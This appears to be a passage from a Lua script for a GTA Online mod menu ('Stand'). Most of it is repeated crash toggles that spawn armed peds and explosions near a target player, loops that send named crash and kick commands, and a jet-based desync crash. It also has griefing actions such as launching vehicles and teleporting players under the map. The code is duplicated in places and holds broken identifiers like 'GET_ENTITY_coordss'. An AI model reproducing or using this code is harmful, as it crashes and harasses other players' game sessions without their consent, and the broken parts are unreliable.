                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Manuel Crash", {"manuelcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_manuel')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            
            menu.toggle_loop(oxtypecrashtoggle, "Taostranslator Crash", {"taostranslatorcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_taostranslator')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Taostranslator2 Crash", {"taostranslator2crash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_taostranslator2')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Tenniscoach Crash", {"tenniscoachcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_tenniscoach')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -1, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Wade Crash", {"wadecrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_wade')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -1, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Shop HIGH Crash", {"shophighcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('S_F_M_Shop_HIGH')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Franklin Crash", {"franklincrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('P_Franklin_02')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Lazlow Crash", {"lazlowcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('CS_Lazlow')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Siemon Crash", {"siemoncrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('IG_SiemonYetarian')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            notification("Worth it HAHA!!!", colors.red)
            end
            
            end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function random_args(id, amount)
    local args = {id}
    if not amount or amount == 0 then
        return args
    else
        for i = 2, amount + 1 do
            args[i] = math.random(-2147483647, 2147483647)
        end
        return args
    end
end


    	local standcrash = menu.list(Removals_List, "Stand Crash Loops", {}, "")

	menu.divider(standcrash, "Stand Crash Loops")

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Elegant", {"togglecrash"}, "Blocked by most menus.", function()
            notification("Elegant sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("crash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Irresponsible Disclosure", {"togglesmash"}, "Note: Use Panic Mode.", function(on_loop)
            notification("Irresponsible Disclosure sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("smash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "BDSM", {"togglechoke"}, "Blocked by popular menus.", function(on_loop)
            notification("BDSM sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("choke" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Indecent Exposure", {"toggleflashcrash"}, "Blocked by popular menus.", function(on_loop)
            notification("Indecent Exposure sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("flashcrash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Next-Gen", {"togglengcrash"}, "Blocked by popular menus.", function(on_loop)
            notification("Next-Gen sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("ngcrash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Steamroller", {"togglesteamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
            notification("Steamroller sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("steamroll" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Burger King Foot Lettuce", {"togglefootlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
            notification("Burger King Foot Lettuce sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("footlettuce" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Vehicular Manslaughter", {"toggleslaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
            notification("Vehicular Manslaughter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("slaughter" .. players.get_name(pid))
        end)
    end

-------------------------------------------------------------------------------------------------------------------------------------------------------------

    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS

    local function tpTableToPlayer(tbl, pid)
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
            local c = getEntityCoords(getPlayerPed(pid))
            for _, v in pairs(tbl) do
                if (not PED.IS_PED_A_PLAYER(v)) then
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
                end
            end
        end
    end

    function TpAllPeds(player)
        local pedHandles = entities.get_all_peds_as_handles()
        tpTableToPlayer(pedHandles, player)
    end
    function TpAllVehs(player)
        local vehHandles = entities.get_all_vehicles_as_handles()
        tpTableToPlayer(vehHandles, player)
    end
    function TpAllObjects(player)
        local objHandles = entities.get_all_objects_as_handles()
        tpTableToPlayer(objHandles, player)
    end
    function TpAllPickups(player)
        local pickupHandles = entities.get_all_pickups_as_handles()
        tpTableToPlayer(pickupHandles, player)
    end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

menu.action(Plyrveh_list, "Kick from Vehicle", {}, "", function()
    local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
    local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
    PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
    util.yield(50)
    ChangeNetObjOwner(veh, pid)
    ChangeNetObjOwner(veh, pped)
    util.yield(50)
    PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
end)

    menu.action(Plyrveh_list, "Beast Freeze", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        menu.trigger_commands("beast" .. players.get_name(pid))
        repeat 
            util.yield()
        until not ENTITY.IS_ENTITY_VISIBLE(ped) and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0
        util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD)
    end)

    menu.action(Plyrveh_list, "Launch Vehicle Up", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)
    menu.action(Plyrveh_list, "Launch Vehicle Forward", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(Plyrveh_list, "Slingshot Vehicle", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(Plyrveh_list, "Spawn Ramp In Front Of Player", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)
    menu.action(Plyrveh_list, "Teleport under the map", {}, "Teleport them in the void", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        c.z = c.z - 100
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            RequestControl(veh)
            floorcoords = floorcoords - 50
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
        else
            util.toast(players.get_name(pid).. " is not in a vehicle")
        end
    end)
    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end

    function is_ped_player(ped)
        if PED.GET_PED_TYPE(ped) >= 4 then
            return false
        else
            return true
        end
    end


local planes = {'cuban800','titan','duster','luxor','Stunt','mammatus','velum','Shamal','Lazer','vestra','volatol','besra','dodo','alkonost','velum2','hydra','luxor2','nimbus','howard','alphaz1','seabreeze','nokota','molotok','starling','tula','microlight','rogue','pyro','mogul','strikeforce'} -- 'tr3','chernobog','avenger',
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end


-- local jet_netID;
menu.action(newcrash, "Ka-Chow (Flight Sim)", {}, "Press and hold down the enter button", function()
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end)

players.on_join(function(pid)
    if G_GeneratedList then
        generatePlayerTeleports()
    end
    -- playerFuncs(pid)
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------

local planess = {'cargoplane'} -- 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed', 'proptrailer', 'tr4'
local coordss = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_coordss(handle)
            ENTITY.SET_ENTITY_coordss_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_coordss(GetLocalPed())
            ENTITY.SET_ENTITY_coordss_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

-- local jet_netID;
menu.action(newcrash, "Ka-Chow (Lightening Mcqueen)", {}, "Press and hold down the enter button", function()
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planess
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
